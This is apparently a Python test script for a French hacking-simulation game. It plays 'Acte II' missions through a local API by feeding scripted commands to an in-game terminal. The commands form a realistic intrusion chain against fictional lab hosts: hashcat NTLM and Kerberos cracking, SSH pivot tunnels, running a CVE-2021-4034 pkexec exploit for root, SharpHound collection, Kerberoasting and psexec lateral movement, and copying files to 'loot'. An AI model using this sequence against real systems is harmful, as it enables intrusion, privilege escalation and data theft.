"""Parcours Acte II par API locale en mémoire et profils temporaires."""
import asyncio
import copy
import json
import tempfile
from pathlib import Path
import httpx
from api import main as api
from engine.career import Career
from engine.act2 import CHAPTERS
from act1_validation import play as play_act1

SSH=[('r','ssh ops@10.71.1.10'),('r','Relais2026!')]
PIVOT=[('r','ssh -N -L 8080:10.72.0.20:80 ops@10.71.1.10'),('r','Relais2026!')]
COPY=[('c','scp ops@10.71.1.10:/srv/exports/CT-26-201.txt ~/loot/compte.txt'),('c','Relais2026!'),('c','cat ~/loot/compte.txt')]
PATHS={
'act2_passation':[('c','cat ~/mission/passation.txt'),('c','hashcat -m 1000 ~/mission/ops.ntlm ~/mission/mots.txt'),('c','hashcat -m 1000 --show ~/mission/ops.ntlm'),('m','rapport OR-26-201')],
'act2_compte':SSH+[('r','id'),('r','uname -a'),('r','sudo -l'),*COPY,('m','livraison CT-26-201')],
'act2_polkit':[('c','ssh ops@10.71.1.11'),('c','Relais2026!'),('c','dpkg-query -W policykit-1'),('c','pkexec --version'),('c','exit'),*SSH,('r','dpkg-query -W policykit-1'),('r','stat /usr/bin/pkexec'),('r','gcc /home/ops/cve-2021-4034.c -o /home/ops/polkit-lab'),('r','/home/ops/polkit-lab'),('r','id'),('r','cat /root/passation.txt'),('m','preuve OR-ROOT-203')],
'act2_reseau':SSH+[('r','ip addr'),('r','ip route'),('r','ss -lntp'),('r','cat /home/ops/reseau.txt'),('m','rapport 10.72.0.0/24')],
'act2_pivot':PIVOT+[('c','curl -o ~/loot/registre.txt http://127.0.0.1:8080/registre.txt'),('c','cat ~/loot/registre.txt'),('m','livraison OR-NET-205')],
'act2_annuaire':[('c','ldapsearch -x -H ldap://10.71.2.10 -D audit@orbe.lab -W -b "DC=orbe,DC=lab" "(objectClass=*)"'),('c','Audit2026!'),('c','scp ~/tools/sharphound.exe audit@10.71.2.21:C:/Users/audit/sharphound.exe'),('c','Audit2026!'),('r','ssh audit@10.71.2.21'),('r','Audit2026!'),('r',r'C:\Users\audit\sharphound.exe --CollectionMethods Group,ObjectProps --OutputDirectory C:\Users\audit --ZipFileName orbe.zip'),('c','scp audit@10.71.2.21:C:/Users/audit/orbe.zip ~/loot/orbe.zip'),('c','Audit2026!'),('b','/home/operator/loot/orbe.zip'),('m','rapport OR-AD-206')],
'act2_service':[('c','impacket-GetUserSPNs orbe.lab/audit:Audit2026! -dc-ip 10.71.2.10'),('c','impacket-GetUserSPNs orbe.lab/audit:Audit2026! -dc-ip 10.71.2.10 -request -outputfile /home/operator/loot/tickets.txt'),('c','hashcat -m 13100 ~/loot/tickets.txt ~/mission/services.txt'),('c','hashcat -m 13100 --show ~/loot/tickets.txt'),('m','rapport OR-SPN-207')],
'act2_lateral':[('r','impacket-psexec orbe.lab/svc.backup@Service2026!@10.71.2.30')],
'act2_garant':[('c','cat ~/mission/garant.txt')]+SSH+[('r','cat /home/ops/recu.txt'),('m','{choice} AC-26-209')],
'act2_binome':[]}
PATHS['act2_lateral']=[('r','impacket-psexec orbe.lab/svc.backup@10.71.2.30'),('r','Service2026!'),('r','whoami /all'),('r','systeminfo'),('r',r'type C:\Data\exports\OR-26-208.txt'),('c','smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-208.txt /home/operator/loot/lateral.txt"'),('c','cat ~/loot/lateral.txt'),('m','livraison OR-26-208')]
FINALS={
'pivot':PIVOT+[('c','curl -o ~/loot/binome.csv http://127.0.0.1:8080/bordereau.csv'),('c','cat ~/loot/binome.csv'),('m','livraison OR-26-210 pivot')],
'smb':[('c','smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-210.csv /home/operator/loot/binome.csv"'),('c','cat ~/loot/binome.csv'),('m','livraison OR-26-210 smb')]}
SIDE={
'act2_side_empreinte':[('c','hashcat -m 1000 ~/mission/secours.ntlm ~/mission/secours.txt')],
'act2_side_permissions':SSH+[('r','id'),('r','sudo -l')],
'act2_side_tunnel':PIVOT+[('c','curl http://127.0.0.1:8080/diagnostic.txt')],
'act2_side_annuaire':[('c','ldapsearch -x -H ldap://10.71.2.10 -D audit@orbe.lab -w Audit2026! -b "DC=orbe,DC=lab" "(servicePrincipalName=*)"')],
'act2_side_correctifs':[('r','impacket-psexec orbe.lab/svc.backup@10.71.2.30'),('r','Service2026!'),('r','systeminfo'),('r','powershell'),('r','Get-HotFix')],
'act2_side_recu':[('c','smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-216.txt /home/operator/loot/lateral.txt"'),('c','cat ~/loot/lateral.txt')]}


async def play(profile,variant='pivot',sides=True,bootstrap=True):
    if bootstrap:await play_act1(profile,'sqlmap' if variant=='pivot' else 'connecteur',False)
    saved=api._CAREER,api._WORKSPACE,api.GAMES,api.CONNECTIONS
    api._CAREER=profile;api._WORKSPACE=None;api.GAMES={};api.CONNECTIONS={};records=[];resumes=0
    try:
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=api.app),base_url='http://test') as client:
            selected={cid:copy.deepcopy(PATHS[cid]) for cid,_,_ in CHAPTERS};selected['act2_binome']=FINALS[variant]
            if variant=='smb': selected['act2_garant']=[('c','cat ~/mission/garant.txt')]+PIVOT+[('c','curl -o ~/loot/garant.txt http://127.0.0.1:8080/garant.txt'),('c','cat ~/loot/garant.txt'),('m','{choice} AC-26-209')]
            if sides:selected.update({cid:ops+[('m','rapport '+cid)] for cid,ops in SIDE.items()})
            for cid,operations in selected.items():
                definition=api._load_contracts()[cid]
                world=(await client.get('/api/social')).json()
                assert any(o['id']==cid for o in world['offers']),(cid,world['offers'])
                created=await client.post('/api/games',json={'contract':cid,'handle':'NightShift','rng_seed':0})
                assert created.status_code==200,(cid,created.text)
                gid=created.json()['id'];record=dict(contract=cid,operations=[])
                for index,(kind,line) in enumerate(operations):
                    line=line.replace('{choice}','refuser' if variant=='pivot' else 'renegocier')
                    if kind=='m':response=await client.post(f'/api/games/{gid}/chat',json={'channel':'telegrid','peer':definition['client']['handle'],'text':line})
                    elif kind=='b':response=await client.post(f'/api/games/{gid}/bloodhound/import',json={'path':line})
                    else:
                        response=await client.post(f'/api/games/{gid}/terminal',json={'line':line,'console_id':'main' if kind=='c' else 'remote'})
                        assert response.status_code==200 and (response.json()['ok'] if line!='sudo -l' else not response.json()['ok']),(cid,line,response.text)
                    assert response.status_code==200,(cid,line,response.text)
                    while api.GAMES[gid].loop.pending():api.GAMES[gid].loop.tick()
                    profile.checkpoint(api.GAMES[gid].state)
                    record['operations'].append(dict(kind=kind,line=line))
                    if index==max(0,(len(operations)-1)//2) and api.GAMES[gid].state.status=='RUNNING':
                        slot=await client.post('/api/saves/write',json={'name':'Acte II — '+cid})
                        loaded=await client.post('/api/saves/load',json={'slot_id':slot.json()['id'],'confirm':True})
                        assert loaded.status_code==200,loaded.text
                        resumed=await client.post('/api/profile/resume',json={});assert resumed.status_code==200,resumed.text
                        gid=resumed.json()['id'];resumes+=1
                state=api.GAMES[gid].state
                assert state.contract_outcome=='SUCCESS',(cid,state.status,state.tool_data.get('facts'),state.tool_data.get('investigation'))
                profile.settle(gid,state);record.update(payout=state.payout,balance=profile.data['money']);records.append(record)
            assert profile.view()['act2']['completed']==10
            assert profile.data['choices']['act2_binome']=='binome_'+variant
            ledger=profile.data['wallet']['entries'];balance=0
            for entry in ledger:balance+=entry['amount'];assert balance==entry['balance']
            assert balance==profile.data['money']
            return dict(variant=variant,missions=10,sides=6 if sides else 0,resumes=resumes,records=records,choices=profile.data['choices'],balance=balance)
    finally:api._CAREER,api._WORKSPACE,api.GAMES,api.CONNECTIONS=saved


async def qualify(output):
    output.mkdir(parents=True,exist_ok=True);reports=[]
    with tempfile.TemporaryDirectory(prefix='darknet-act2-') as folder:
        for variant in FINALS:reports.append(await play(Career(Path(folder)/(variant+'.json')),variant))
    (output/'act2-qualification.json').write_text(json.dumps(reports,ensure_ascii=False,indent=2)+'\n', encoding='utf-8')
    print('Acte II : deux carrières depuis l’acte I, dix dossiers, six contrats facultatifs, deux finales, décisions et reprises vérifiées.')
    return reports


if __name__=='__main__':
    import sys
    asyncio.run(qualify(Path(sys.argv[1]) if len(sys.argv)>1 else Path('build/validation')))
